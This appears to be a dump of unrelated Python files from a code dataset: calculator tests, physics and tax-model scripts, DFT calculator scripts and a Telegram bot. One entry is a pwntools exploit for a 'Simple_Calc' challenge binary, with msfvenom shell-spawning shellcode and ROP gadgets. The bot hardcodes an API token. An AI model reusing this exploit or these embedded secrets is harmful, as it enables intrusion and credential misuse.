self.calc.substract(2, 2))\n        self.assertEqual(4, self.calc.substract(2, -2))\n        self.assertEqual(-4, self.calc.substract(-2, 2))\n        self.assertEqual(0, self.calc.substract(-2, -2))\n        self.assertEqual(1, self.calc.substract(1, 0))\n    \n    def test_multiply_method_returns_correct_result(self):\n        self.assertEqual(4, self.calc.multiply(2, 2))\n        self.assertEqual(-4, self.calc.multiply(2, -2))\n        self.assertEqual(-4, self.calc.multiply(-2, 2))\n        self.assertEqual(4, self.calc.multiply(-2, -2))\n        self.assertEqual(0, self.calc.multiply(1, 0))\n\n    def test_divide_method_returns_correct_result(self):\n        self.assertEqual(1, self.calc.divide(2, 2))\n        self.assertEqual(1.5, self.calc.divide(3, 2))\n    \n    def test_power_method_returns_correct_result(self):\n        self.assertEqual(4, self.calc.power(2, 2))\n        self.assertEqual(531441, self.calc.power(3, 12))\n        self.assertAlmostEqual(2.838, self.calc.power(2, 1.5), delta=0.0000001)\n    \n    def test_square_method_returns_correct_result(self):\n        self.assertEqual(3, self.calc.square(9))\n        self.assertEqual(9, self.calc.square(81))\n        self.assertAlmostEqual(1.2247, self.calc.square(1.5), delta=0.0000001)\n    \n    def test_log10_method_returns_correct_result(self):\n        self.assertEqual(1, self.calc.log10(10))\n        self.assertAlmostEqual(1.3010, self.calc.log10(20), delta=0.0000001)\n        self.assertAlmostEqual(2.3979, self.calc.log10(250), delta=0.0000001)\n\n    #FAILS WITH NON PARAMETER SECTION\n    def test_add_method_fails_with_nan_parameter(self):\n        self.assertRaises(TypeError, self.calc.add, \"2\", 2)\n        self.assertRaises(TypeError, self.calc.add, 2, \"2\")\n        self.assertRaises(TypeError, self.calc.add, \"2\", \"2\")\n        self.assertRaises(TypeError, self.calc.add, None, 2)\n        self.assertRaises(TypeError, self.calc.add, 2, None)\n        self.assertRaises(TypeError, self.calc.add, object(), 2)\n        self.assertRaises(TypeError, self.calc.add, 2, object())\n\n    def test_substract_method_fails_with_nan_parameter(self):\n        self.assertRaises(TypeError, self.calc.substract, \"2\", 2)\n        self.assertRaises(TypeError, self.calc.substract, 2, \"2\")\n        self.assertRaises(TypeError, self.calc.substract, \"2\", \"2\")\n        self.assertRaises(TypeError, self.calc.substract, None, 2)\n        self.assertRaises(TypeError, self.calc.substract, 2, None)\n        self.assertRaises(TypeError, self.calc.substract, object(), 2)\n        self.assertRaises(TypeError, self.calc.substract, 2, object())\n\n    def test_divide_method_fails_with_nan_parameter(self):\n        self.assertRaises(TypeError, self.calc.divide, \"2\", 2)\n        self.assertRaises(TypeError, self.calc.divide, 2, \"2\")\n        self.assertRaises(TypeError, self.calc.divide, \"2\", \"2\")\n    \n    def test_power_method_fails_with_nan_parameter(self):\n        self.assertRaises(TypeError, self.calc.power, \"2\", 2)\n        self.assertRaises(TypeError, self.calc.power, 2, \"2\")\n        self.assertRaises(TypeError, self.calc.power, \"2\", \"2\")\n        self.assertRaises(TypeError, self.calc.power, None, 2)\n        self.assertRaises(TypeError, self.calc.power, 2, None)\n        self.assertRaises(TypeError, self.calc.power, object(), 2)\n        self.assertRaises(TypeError, self.calc.power, 2, object())\n\n    def test_square_method_fails_with_nan_parameter(self):\n        self.assertRaises(TypeError, self.calc.square, \"2\")\n        self.assertRaises(TypeError, self.calc.square, None)\n        self.assertRaises(TypeError, self.calc.square, object())\n    \n    def test_log10_method_fails_with_nan_parameter(self):\n        self.assertRaises(TypeError, self.calc.log10, \"2\")\n        self.assertRaises(TypeError, self.calc.log10, None)\n        self.assertRaises(TypeError, self.calc.log10, object())\n\n    def test_divide_method_fails_with_division_by_zero(self):\n        self.assertRaises(TypeError, self.calc.divide, 2, 0)\n        self.assertRaises(TypeError, self.calc.divide, 2, -0)\n        self.assertRaises(TypeError, self.calc.divide, 0, 0)\n        self.assertRaises(TypeError, self.calc.divide, \"0\", 0)\n\n    def test_square_method_fails_with_negative_parameter(self):\n        self.assertRaises(TypeError, self.calc.square, -0)\n        self.assertRaises(TypeError, self.calc.square, 0)\n        self.assertRaises(TypeError, self.calc.square, \"0\")\n        self.assertRaises(TypeError, self.calc.square, -5)\n\n    def test_log10_method_fails_with_negative_or_zero_parameter(self):\n        self.assertRaises(TypeError, self.calc.log10, -0)\n        self.assertRaises(TypeError, self.calc.log10, 0)\n        self.assertRaises(TypeError, self.calc.log10, \"0\")\n        self.assertRaises(TypeError, self.calc.log10, -5)\n        self.assertRaises(TypeError, self.calc.log10, -10)\n        self.assertRaises(TypeError, self.calc.log10, \"-5\")\n\n    @patch('app.util.validate_permissions', side_effect=mocked_validation, create=True)\n    def test_multiply_method_returns_correct_result(self, _validate_permissions):\n        self.assertEqual(4, self.calc.multiply(2, 2))\n        self.assertEqual(0, self.calc.multiply(1, 0))\n        self.assertEqual(0, self.calc.multiply(-1, 0))\n        self.assertEqual(-2, self.calc.multiply(-1, 2))\n    \n    @patch('app.util.validate_permissions', side_effect=mocked_validation, create=True)\n    def test_multiply_method_fails_with_nan_parameter(self):\n        self.assertRaises(TypeError, self.calc.multiply, \"2\", 2)\n        self.assertRaises(TypeError, self.calc.multiply, 2, \"2\")\n        self.assertRaises(TypeError, self.calc.multiply, \"2\", \"2\")\n        self.assertRaises(TypeError, self.calc.multiply, None, 2)\n        self.assertRaises(TypeError, self.calc.multiply, 2, None)\n        self.assertRaises(TypeError, self.calc.multiply, object(), 2)\n        self.assertRaises(TypeError, self.calc.multiply, 2, object())\n\n\nif __name__ == \"__main__\":  # pragma: no cover\n    unittest.main()\n", "382": "from pwn import *\n\nc = process('./Simple_Calc')\ngdb.attach(c, \"\"\"\n    b *0x401556\n\"\"\")\n'''\nmsfvenom --payload linux/x64/exec CMD='/bin/sh' --format python\nNo platform was selected, choosing Msf::Module::Platform::Linux from the payload\nNo Arch selected, selecting Arch: x86_64 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 47 bytes'''\nbuf =  \"\"\nbuf += \"\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\"\nbuf += \"\\x00\\x53\\x48\\x89\\xe7\\x68\\x2d\\x63\\x00\\x00\\x48\\x89\\xe6\"\nbuf += \"\\x52\\xe8\\x08\\x00\\x00\\x00\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\"\nbuf += \"\\x00\\x56\\x57\\x48\\x89\\xe6\\x0f\\x05\"\n\n''' Our ROP Chain\n*addr = 0x6c1000\nlen = 0x1000\nprot = 0x7\nmprotect ((void*)0x6c1000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC);\n>> 0\n>> 0x6c1000\n>> 0x1000\nread(stdin, (void*) 0x6c1000, 0x1000);\n0x6c1000\n'''\ndef ValCalc(target, s):\n    if (int(target) == 0):\n        s.sendline (\"2\")\n        s.sendline (\"40\")\n        s.sendline (\"40\")\n    else:\n        s.sendline (\"1\")\n        s.sendline (str(int(target)-40))\n        s.sendline (\"40\")\n\nraw_input(\"Waiting for GDB >> \")\nc.send(\"255\\n\")\n\nrdx_rsi_gadget = 0x437aa9 # pop rdx; pop rsi; ret\nrdi_gadget = 0x401b73 # pop rdi; ret\nmprotect = 0x435690 # int mprotect(void *addr, size_t len, int prot);\nfn_read = 0x434b20 # ssize_t read(int fd, void *buf, size_t count);\ndata = 0x6c1000 #target\n\nfor x in range(18):\n    ValCalc(0,c)\n\n'''\n# pop rdi, rsi, rdx\nValCalc(rdi_gadget, c)\nValCalc(0, c)\nValCalc(data,c)\nValCalc(0, c)\nValCalc(rdx_rsi_gadget, c)\nValCalc(0, c)\nValCalc(0x7,c)\nValCalc(0, c)\nValCalc(0x1000, c)\nValCalc(0, c)\nValCalc(mprotect, c)\nValCalc(0, c)\n\nValCalc(rdi_gadget, c)\nValCalc(0, c)\nValCalc(0, c) #stdin\nValCalc(0, c)\nValCalc(rdx_rsi_gadget, c)\nValCalc(0, c)\nValCalc(0x1000, c)\nValCalc(0, c)\nValCalc(data, c)\nValCalc(0, c)\nValCalc(fn_read, c)\nValCalc(0, c)\n\nValCalc(data, c)\nValCalc(0, c)'''\n\n\nc.send(\"5\\n\")\nc.sendline(buf)\n# give me my shell\nc.interactive()\n", "383": "from graspy.grasp import *\n\ndef gen_nucleus(calc_dir,Z):\n    cmds = [Rnucleus(Z=Z,A=172,neutralMass=171.936368659,I=0,NDM=0,NQM=0,rms_radius = 5.294,thickness = 2.18)]\n    return [cmd.execute(workdir = calc_dir) for cmd in cmds]\n\ndef angular_integration(calc_dir):\n    return Rangular().execute(workdir = calc_dir)\n\ndef estimate_wavefunctions(calc_dir,previous_rwfn, grid):\n    return Rwfnestimate(grid = grid, orbdict = {'*': previous_rwfn},fallback = 'Thomas-Fermi').execute(workdir = calc_dir)\n\nmaster_grid = {'RNT': 2.857142857143E-08, 'H': 0.05, 'HP':0 , 'N': 590}\n\ndef run_hartree_fock_save(calc_dir,grid,orbs = ['*'],specorbs = ['*'],integration_method = None,calc_name = None):\n    #out = Rmcdhf(asfidx = [[1],[1],[1],[1,2],[1,2],[1,2],[1],[1,2],[1]],orbs = orbs, specorbs = specorbs, runs = 20000, weighting_method = 'Standard',integration_method = integration_method,grid = grid).execute(workdir = calc_dir)\n    out = Rmcdhf(asfidx = [[1],[1],[1],[1,2],[1,2],[1,2,3,4,5],[1],[1,2,3,4],[1,2,3,4],[1,2,3]],orbs = orbs, specorbs = specorbs, runs = 20000, weighting_method = 'Standard',integration_method = integration_method,grid = grid).execute(workdir = calc_dir)\n\n    if calc_name is not None:\n        Rsave(calc_name).execute(workdir = calc_dir)\n        return os.path.join(calc_dir,calc_name) + '.w'\n    else:\n        return out\ndef run_ci(calc_dir,calc_name,largest_n):\n    return Rci(calcname = calc_name,\n               includetransverse=True,\n               modifyfreq=True,\n               scalefactor='1.d-6',\n               includevacpol = True,\n               includenms= False,\n               includesms = False,\n               estselfenergy= True,\n               largestn = largest_n,\n               asfidx = [[1],[1],[1],[1,2],[1,2],[1,2,3,4,5],[1],[1,2,3,4],[1,2,3,4],[1,2,3]]).execute(workdir = calc_dir)\n\ndef csfs_open_maxn(calc_dir,write_csf,maxn,exc):\n    # max_n: a list of 4 quantum numbers representing the maximum s,p,d, and f shells.\n    # 4f14 6s2  with 6s excitable\n    # 4f14 6s 6p with 6p excitable\n    # 4f14 6s 5d with 5d excitable\n    # 4f13 6s2 5d with 4f excitable\n    mr =   [Rcsfgenerate('Kr','4d(10,c)5s(2,i)5p(6,i)4f(14,i)6s(2,*)',\n            activeset=[maxn[0],5,4,4],jlower=0,jhigher=2,exc=exc,\n            ordering = 'User specified',write_csf = write_csf),\n\n            Rcsfgenerate('Kr','4d(10,c)5s(2,i)5p(6,i)4f(14,i)6s(1,i)6p(1,*)',         activeset = [6,maxn[1],5,4],jlower=0,jhigher=4,exc=exc,\n            ordering = 'User specified',write_csf = write_csf),\n\n            Rcsfgenerate('Kr','4d(10,c)5s(2,i)5p(6,i)4f(14,i)6s(1,i)5d(1,*)',         activeset = [6,5,maxn[2],4],jlower=2,jhigher=6,exc=exc,\n            ordering = 'User specified',write_csf = write_csf),\n\n            Rcsfgenerate('Kr','4d(10,c)5s(2,i)5p(6,i)4f(13,*)6s(2,i)5d(1,i)',         activeset = [6,5,5,maxn[3]],jlower=4,jhigher=10,exc=exc,\n            ordering = 'User specified',write_csf = write_csf)]\n    combined = mr[0] + mr[1] + mr[2] + mr[3]\n    return combined.execute(workdir = calc_dir)\n\ndef csfs_open_maxn_safronova(calc_dir,write_csf,maxn,exc):\n    # max_n: a list of 4 quantum numbers representing the maximum s,p,d, and f shells.\n    # 4f14 6s2  with 6s excitable\n    # 4f14 6s 6p with 6p excitable\n    # 4f14 6s 5d with 5d excitable\n    # 4f13 6s2 5d with 4f excitable\n    # 4f13 6s2 6p with 6p,4f excitable\n    mr =   [Rcsfgenerate('Kr','4d(10,c)5s(2,i)5p(6,i)4f(14,i)6s(2,*)',\n            activeset=[maxn[0],5,4,4],jlower=0,jhigher=2,exc=exc,\n            ordering = 'User specified',write_csf = write_csf),\n\n            Rcsfgenerate('Kr','4d(10,c)5s(2,i)5p(6,i)4f(14,i)6s(1,i)6p(1,*)',         activeset = [6,maxn[1],5,4],jlower=0,jhigher=4,exc=exc,\n            ordering = 'User specified',write_csf = write_csf),\n\n            Rcsfgenerate('Kr','4d(10,c)5s(2,i)5p(6,i)4f(14,i)6s(1,i)5d(1,*)',         activeset = [6,5,maxn[2],4],jlower=2,jhigher=6,exc=exc,\n            ordering = 'User specified',write_csf = write_csf),\n\n            Rcsfgenerate('Kr','4d(10,c)5s(2,i)5p(6,i)4f(13,*)6s(2,i)5d(1,i)',         activeset = [6,5,5,maxn[3]],jlower=4,jhigher=10,exc=exc,\n            ordering = 'User specified',write_csf = write_csf),\n            Rcsfgenerate('Kr','4d(10,c)5s(2,i)5p(6,i)4f(13,*)6s(2,i)6p(1,*)',         activeset = [6,maxn[1],4,maxn[3]],jlower=0,jhigher=4,exc=exc,\n            ordering = 'User specified',write_csf = write_csf)]\n    combined = mr[0] + mr[1] + mr[2] + mr[3] + mr[4]\n    return combined.execute(workdir = calc_dir)\n\ncalc_dirs =['/home/calvin/graspy/calc-outputs/yb_basis_set/spec',\n            '/home/calvin/graspy/calc-outputs/yb_basis_set/6spd5f',\n            '/home/calvin/graspy/calc-outputs/yb_basis_set/7spd6f',\n            '/home/calvin/graspy/calc-outputs/yb_basis_set/8spdf',]\n\nrwfn_out_files = ['/home/calvin/graspy/calc-scripts/cores/yb_6s2master.w']\n################\n# Spectroscopic Orbitals\n################\ninitialize(workdir = calc_dirs[0],clist = ['1s','2s','2p','3s','3p','3d','4s','4p','4d','5s','5p','4f','5d','6s','6p','5f','6d','7p','8s'])\ngen_nucleus(calc_dirs[0],Z = 70)\ncsfs_open_maxn_safronova(calc_dirs[0],maxn = [6,6,5,4],exc = 0,write_csf = 'rcsfmr.inp')\nangular_integration(calc_dirs[0])\nestimate_wavefunctions(calc_dirs[0],previous_rwfn = rwfn_out_files[-1], grid = master_grid) # use yb_6s2master.w\nrwfn_out_files.append(run_hartree_fock_save(calc_dirs[0],master_grid,orbs = ['1*','2*','3*','4s*','4p*','4d*'],specorbs = ['*'],integration_method = None,calc_name = 'spec'))\n# input('1-4d OK? ')\nestimate_wavefunctions(calc_dirs[0],previous_rwfn = rwfn_out_files[-1], grid = master_grid)\nrwfn_out_files.append(run_hartree_fock_save(calc_dirs[0],master_grid,orbs = ['1*','2*','3*','4s*','4p*','4d*','5s*','5p*'],specorbs = ['*'],integration_method = 4,calc_name = 'spec')) # method 4 works.\n# input('5sp OK? ')\nestimate_wavefunctions(calc_dirs[0],previous_rwfn = rwfn_out_files[-1], grid = master_grid)\nrwfn_out_files.append(run_hartree_fock_save(calc_dirs[0],master_grid,orbs = ['1*','2*','3*','4s*','4p*','4d*','5s*','5p*','6s*'],specorbs = ['*'],integration_method = 4,calc_name = 'spec'))\n# input('6s OK?')\nestimate_wavefunctions(calc_dirs[0],previous_rwfn = rwfn_out_files[-1], grid = master_grid)\nrwfn_out_files.append(run_hartree_fock_save(calc_dirs[0],master_grid,orbs = ['1*','2*','3*','4s*','4p*','4d*','5s*','5p*','6s*','4f*'],specorbs = ['*'],integration_method = 4,calc_name = 'spec'))\n# input('4f OK?')\nestimate_wavefunctions(calc_dirs[0],previous_rwfn = rwfn_out_files[-1], grid = master_grid)\nrwfn_out_files.append(run_hartree_fock_save(calc_dirs[0],master_grid,orbs = ['1*','2*','3*','4s*','4p*','4d*','5s*','5p*','6s*','4f*','5d*'],specorbs = ['*'],integration_method = 4,calc_name = 'spec'))\n# input('5d OK?')\nestimate_wavefunctions(calc_dirs[0],previous_rwfn = rwfn_out_files[-1], grid = master_grid)\nrwfn_out_files.append(run_hartree_fock_save(calc_dirs[0],master_grid,orbs = ['*'],specorbs = ['*'],integration_method = 4,calc_name = 'spec'))\n# input('All spectroscopic orbitals OK?') they all look fine!\n#################\n# Add 6d and 5f\n#################\ninitialize(workdir = calc_dirs[1],clist = ['1s','2s','2p','3s','3p','3d','4s','4p','4d','5s','5p','4f','5d','6s','6p','5f','6d','7p','8s'])\ncsfs_open_maxn_safronova(calc_dirs[1],maxn = [6,6,6,5],exc = 1,write_csf = 'rcsf.inp')\nangular_integration(calc_dirs[1])\nz_iter_rwfn = []\nimport numpy as np\nfor Z in np.linspace(71,70,num=5):\n    gen_nucleus(calc_dirs[1],Z = Z)\n    estimate_wavefunctions(calc_dirs[1],previous_rwfn = rwfn_out_files[-1], grid = master_grid)\n    z_iter_rwfn.append(run_hartree_fock_save(calc_dirs[1],master_grid,orbs = ['6d*'],specorbs =[] ,integration_method = 3,calc_name = '6spd5f'))\n    estimate_wavefunctions(calc_dirs[1],previous_rwfn = z_iter_rwfn[-1], grid = master_grid)\n    z_iter_rwfn.append(run_hartree_fock_save(calc_dirs[1],master_grid,orbs = ['5f*'],specorbs = [],integration_method = 3,calc_name = '6spd5f'))\nestimate_wavefunctions(calc_dirs[1],previous_rwfn = rwfn_out_files[-1], grid = master_grid)\n# input(f'6d 5f OK Z = {Z}?') both look fine, a bit close to continuum state.\nrwfn_out_files.append(z_iter_rwfn[-1])\nrun_ci(calc_dir = calc_dirs[1],calc_name = '6spd5f',largest_n = 7)\n###############\n# Add 7s\n# Joon suggests: 7s2 and 6s2 in configuration.\n###############\ninitialize(workdir = calc_dirs[2],clist = ['1s','2s','2p','3s','3p','3d','4s','4p','4d','5s','5p','4f','5d','6s','6p','5f','6d','7p','8s'])\n#csfs_open_maxn_safronova(calc_dirs[2],maxn = [7,7,7,6],exc = 1,write_csf = 'rcsf.inp')\nRcsfgenerate('Kr','4d(10,c)5s(2,i)5p(6,i)4f(14,i)6s(2,*)',\n        activeset=[7,5,4,4],jlower=0,jhigher=2,exc=1,\n        ordering = 'User specified',write_csf = 'rcsf.inp').execute(workdir = calc_dirs[2])\nangular_integration(calc_dirs[2])\nspecorbs = ['1*','2*','3*','4s*','4p*','4d*','5s*','5p*','6s*','4f*','5d*']\ngen_nucleus(calc_dirs[2],Z = Z)\nestimate_wavefunctions(calc_dirs[2],previous_rwfn = rwfn_out_files[-1], grid = master_grid) # use result from 6s6p5d5f\nrwfn_out_files.append(run_hartree_fock_save(calc_dirs[2],master_grid,orbs = ['7s*'],specorbs = [],integration_method = None,calc_name = '7s6pd5f'))\n\n\n", "384": "import copy\nimport numpy as np\nfrom .policy import Policy\nfrom .parameters_base import ParametersBase\n\n\ndef update_ordinary_income(behavioral_effect, calc_y):\n    delta_inc = np.where(calc_y.records.c00100 > 0, behavioral_effect, 0.)\n\n    # Attribute the behavioral effects across itemized deductions,\n    # wages, and other income.\n\n    itemized = np.where(calc_y.records.c04470 < calc_y.records._standard,\n                        0.,\n                        calc_y.records.c04470)\n\n    delta_wages = np.where(calc_y.records.c00100 + itemized > 0,\n                           (delta_inc * calc_y.records.e00200 /\n                            (calc_y.records.c00100 + itemized)),\n                           0.)\n\n    other_inc = calc_y.records.c00100 - calc_y.records.e00200\n\n    delta_other_inc = np.where(calc_y.records.c00100 + itemized > 0,\n                               (delta_inc * other_inc /\n                                (calc_y.records.c00100 + itemized)),\n                               0.)\n\n    delta_itemized = np.where(calc_y.records.c00100 + itemized > 0,\n                              (delta_inc * itemized /\n                               (calc_y.records.c00100 + itemized)),\n                              0.)\n\n    calc_y.records.e00200 = calc_y.records.e00200 + delta_wages\n\n    calc_y.records.e00300 = calc_y.records.e00300 + delta_other_inc\n\n    calc_y.records.e19570 = np.where(itemized > 0,\n                                     calc_y.records.e19570 + delta_itemized,\n                                     0.)\n    # TODO, we should create a behavioral modification\n    # variable instead of using e19570\n\n    return calc_y\n\n\ndef update_cap_gain_income(cap_gain_behavioral_effect, calc_y):\n    calc_y.records.p23250 = calc_y.records.p23250 + cap_gain_behavioral_effect\n    return calc_y\n\n\ndef behavior(calc_x, calc_y):\n    \"\"\"\n    Modify plan Y records to account for micro-feedback effect that arrise\n    from moving from plan X to plan Y.\n    \"\"\"\n\n    # Calculate marginal tax rates for plan x and plan y.\n    wage_mtr_x, wage_mtr_y = mtr_xy(calc_x, calc_y,\n                                    mtr_of='e00200p',\n                                    liability_type='combined')\n\n    CG_mtr_x, CG_mtr_y = mtr_xy(calc_x, calc_y,\n                                mtr_of='p23250',\n                                liability_type='iitax')\n\n    # Calculate the percent change in after-tax rate for wage and capital gain.\n    wage_pctdiff = ((1 - wage_mtr_y) - (1 - wage_mtr_x)) / (1 - wage_mtr_x)\n    CG_pctdiff = ((1 - CG_mtr_y) - (1 - CG_mtr_x)) / (1 - CG_mtr_x)\n\n    # Calculate the magnitude of the substitution and income effects\n    # Calculate the magnitude of behavior changes on cap gain\n    substitution_effect = (calc_y.behavior.BE_sub * wage_pctdiff *\n                           (calc_x.records.c04800))\n\n    income_effect = calc_y.behavior.BE_inc * (calc_y.records._combined -\n                                              calc_x.records._combined)\n\n    combined_behavioral_effect = income_effect + substitution_effect\n\n    cap_gain_behavioral_effect = (calc_y.behavior.BE_CG_per * CG_pctdiff *\n                                  (calc_x.records.p23250))\n\n    # Add the behavior changes to income sources\n    calc_y_behavior = copy.deepcopy(calc_y)\n    calc_y_behavior = update_ordinary_income(combined_behavioral_effect,\n                                             calc_y_behavior)\n    calc_y_behavior = update_cap_gain_income(cap_gain_behavioral_effect,\n                                             calc_y_behavior)\n\n    # Takes all income updates into considaration\n    calc_y_behavior.calc_all()\n\n    return calc_y_behavior\n\n\ndef mtr_xy(calc_x, calc_y, mtr_of='e00200p', liability_type='combined'):\n\n    payroll_x, iitax_x, combined_x = calc_x.mtr(mtr_of)\n    payroll_y, iitax_y, combined_y = calc_y.mtr(mtr_of)\n\n    if liability_type == 'combined':\n        return (combined_x, combined_y)\n    elif liability_type == 'payroll':\n        return (payroll_x, payroll_y)\n    elif liability_type == 'iitax':\n        return (iitax_x, iitax_y)\n    else:\n        raise ValueError('Choose from combined, iitax, and payroll.')\n\n\nclass Behavior(ParametersBase):\n\n    JSON_START_YEAR = Policy.JSON_START_YEAR\n    DEFAULTS_FILENAME = 'behavior.json'\n    DEFAULT_NUM_YEARS = Policy.DEFAULT_NUM_YEARS\n\n    def __init__(self, behavior_dict=None,\n                 start_year=JSON_START_YEAR,\n                 num_years=DEFAULT_NUM_YEARS,\n                 inflation_rates=None):\n        if behavior_dict:\n            if not isinstance(behavior_dict, dict):\n                raise ValueError('behavior_dict is not a dictionary')\n            self._vals = behavior_dict\n        else:  # if None, read defaults\n            self._vals = self._params_dict_from_json_file()\n        if inflation_rates is not None:\n            raise ValueError('inflation_rates != None in Behavior.__init__')\n        self.initialize(start_year, num_years)\n\n    def update_behavior(self, revisions):\n        \"\"\"\n        Update behavior for given revisions, a dictionary consisting\n        of year:modification dictionaries.\n        For example: {2014: {'_BE_inc': [0.4, 0.3]}}\n        \"\"\"\n        self.set_default_vals()\n        if self.current_year != self.start_year:\n            self.set_year(self.start_year)\n        for year in revisions:\n            if year != self.start_year:\n                self.set_year(year)\n            self._update({year: revisions[year]})\n", "385": "#!/usr/bin/env python3\nimport qepy\nimport time\n\ntry:\n    from mpi4py import MPI\n    comm = MPI.COMM_WORLD\nexcept Exception:\n    comm = None\n\nfrom qepy.calculator import QEpyCalculator\n\ninputfile = 'qe_in.in'\n\ncalc = QEpyCalculator(comm = comm, inputfile = inputfile)\n\nget_potential_energy      = calc.get_potential_energy()\nget_forces                = calc.get_forces()\nget_stress                = calc.get_stress()\nget_density               = calc.get_density()\nget_bz_k_points           = calc.get_bz_k_points()\nget_effective_potential   = calc.get_effective_potential()\nget_eigenvalues           = calc.get_eigenvalues()\nget_fermi_level           = calc.get_fermi_level()\nget_ibz_k_points          = calc.get_ibz_k_points()\nget_k_point_weights       = calc.get_k_point_weights()\nget_magnetic_moment       = calc.get_magnetic_moment()\nget_number_of_bands       = calc.get_number_of_bands()\nget_number_of_grid_points = calc.get_number_of_grid_points()\nget_number_of_spins       = calc.get_number_of_spins()\nget_occupation_numbers    = calc.get_occupation_numbers()\nget_pseudo_density        = calc.get_pseudo_density()\nget_pseudo_wave_function  = calc.get_pseudo_wave_function()\nget_spin_polarized        = calc.get_spin_polarized()\nget_xc_functional         = calc.get_xc_functional()\n\ntime.sleep(0.1)\n\nif calc.rank == 0 :\n    print('ncharge:', get_density.sum()*calc.atoms.get_volume()/get_density.shape[0] , flush = True)\n    print(\"calc.get_potential_energy()           =\" , get_potential_energy           , flush = True)\n    print(\"calc.get_forces()[0]                  =\" , get_forces[0]                  , flush = True)\n    print(\"calc.get_stress()[0]                  =\" , get_stress[0]                  , flush = True)\n    print(\"calc.get_density()[0]                 =\" , get_density[0]                 , flush = True)\n    print(\"calc.get_bz_k_points()[:, 0]          =\" , get_bz_k_points[:, 0]          , flush = True)\n    print(\"calc.get_effective_potential()[0]     =\" , get_effective_potential[0]     , flush = True)\n    print(\"calc.get_eigenvalues()[0]             =\" , get_eigenvalues[0]             , flush = True)\n    print(\"calc.get_fermi_level()                =\" , get_fermi_level                , flush = True)\n    print(\"calc.get_ibz_k_points()[:, 0]         =\" , get_ibz_k_points[:, 0]         , flush = True)\n    print(\"calc.get_k_point_weights()[0]         =\" , get_k_point_weights[0]         , flush = True)\n    print(\"calc.get_magnetic_moment()            =\" , get_magnetic_moment            , flush = True)\n    print(\"calc.get_number_of_bands()            =\" , get_number_of_bands            , flush = True)\n    print(\"calc.get_number_of_grid_points()      =\" , get_number_of_grid_points      , flush = True)\n    print(\"calc.get_number_of_spins()            =\" , get_number_of_spins            , flush = True)\n    print(\"calc.get_occupation_numbers()[0]      =\" , get_occupation_numbers[0]      , flush = True)\n    print(\"calc.get_pseudo_density()[0]          =\" , get_pseudo_density[0]          , flush = True)\n    print(\"calc.get_pseudo_wave_function()[0, 0] =\" , get_pseudo_wave_function[0, 0] , flush = True)\n    print(\"calc.get_spin_polarized()             =\" , get_spin_polarized             , flush = True)\n    print(\"calc.get_xc_functional()              =\" , get_xc_functional              , flush = True)\n\ntime.sleep(0.1)\nprint('ncharge - > rank {} : {}'.format(calc.rank, get_pseudo_density.sum()*calc.atoms.get_volume()/get_number_of_grid_points.prod()), flush=True)\n", "386": "#!/usr/bin/env python3\nimport qepy\nimport time\n\ntry:\n    from mpi4py import MPI\n    comm = MPI.COMM_WORLD\nexcept Exception:\n    comm = None\n\nfrom qepy.calculator import QEpyCalculator\n\ninputfile = 'qe_in.in'\n\ncalc = QEpyCalculator(comm = comm, inputfile = inputfile)\n\nget_potential_energy      = calc.get_potential_energy()\nget_forces                = calc.get_forces()\nget_stress                = calc.get_stress()\nget_density               = calc.get_density()\nget_bz_k_points           = calc.get_bz_k_points()\nget_effective_potential   = calc.get_effective_potential()\nget_eigenvalues           = calc.get_eigenvalues()\nget_fermi_level           = calc.get_fermi_level()\nget_ibz_k_points          = calc.get_ibz_k_points()\nget_k_point_weights       = calc.get_k_point_weights()\nget_magnetic_moment       = calc.get_magnetic_moment()\nget_number_of_bands       = calc.get_number_of_bands()\nget_number_of_grid_points = calc.get_number_of_grid_points()\nget_number_of_spins       = calc.get_number_of_spins()\nget_occupation_numbers    = calc.get_occupation_numbers()\nget_pseudo_density        = calc.get_pseudo_density()\nget_pseudo_wave_function  = calc.get_pseudo_wave_function()\nget_spin_polarized        = calc.get_spin_polarized()\nget_xc_functional         = calc.get_xc_functional()\n\ntime.sleep(0.1)\n\nif calc.rank == 0 :\n    print('ncharge:', get_density.sum()*calc.atoms.get_volume()/get_density.shape[0] , flush = True)\n    print(\"calc.get_potential_energy()           =\" , get_potential_energy           , flush = True)\n    print(\"calc.get_forces()[0]                  =\" , get_forces[0]                  , flush = True)\n    print(\"calc.get_stress()[0]                  =\" , get_stress[0]                  , flush = True)\n    print(\"calc.get_density()[0]                 =\" , get_density[0]                 , flush = True)\n    print(\"calc.get_bz_k_points()[:, 0]          =\" , get_bz_k_points[:, 0]          , flush = True)\n    print(\"calc.get_effective_potential()[0]     =\" , get_effective_potential[0]     , flush = True)\n    print(\"calc.get_eigenvalues()[0]             =\" , get_eigenvalues[0]             , flush = True)\n    print(\"calc.get_fermi_level()                =\" , get_fermi_level                , flush = True)\n    print(\"calc.get_ibz_k_points()[:, 0]         =\" , get_ibz_k_points[:, 0]         , flush = True)\n    print(\"calc.get_k_point_weights()[0]         =\" , get_k_point_weights[0]         , flush = True)\n    print(\"calc.get_magnetic_moment()            =\" , get_magnetic_moment            , flush = True)\n    print(\"calc.get_number_of_bands()            =\" , get_number_of_bands            , flush = True)\n    print(\"calc.get_number_of_grid_points()      =\" , get_number_of_grid_points      , flush = True)\n    print(\"calc.get_number_of_spins()            =\" , get_number_of_spins            , flush = True)\n    print(\"calc.get_occupation_numbers()[0]      =\" , get_occupation_numbers[0]      , flush = True)\n    print(\"calc.get_pseudo_density()[0]          =\" , get_pseudo_density[0]          , flush = True)\n    print(\"calc.get_pseudo_wave_function()[0, 0] =\" , get_pseudo_wave_function[0, 0] , flush = True)\n    print(\"calc.get_spin_polarized()             =\" , get_spin_polarized             , flush = True)\n    print(\"calc.get_xc_functional()              =\" , get_xc_functional              , flush = True)\n\ntime.sleep(0.1)\nprint('ncharge - > rank {} : {}'.format(calc.rank, get_pseudo_density.sum()*calc.atoms.get_volume()/get_number_of_grid_points.prod()), flush=True)\n", "387": "import sys\nfrom io import BytesIO\n\nimport telegram\nfrom flask import Flask, request, send_file\n\nfrom fsm import TocMachine\n\n\nAPI_TOKEN = '485533690:AAHYXUtAohyuRxRKNFueQtqXYm81TP_Ij1E'\nWEBHOOK_URL = 'https://1aec9aa1.ngrok.io/hook'\n\napp = Flask(__name__)\nbot = telegram.Bot(token=API_TOKEN)\nmachine = TocMachine(\n    states=[\n    \t'init',\n        'start',\n        'best',\n        'bestRes',\n        'all',\n        'all_bank',\n        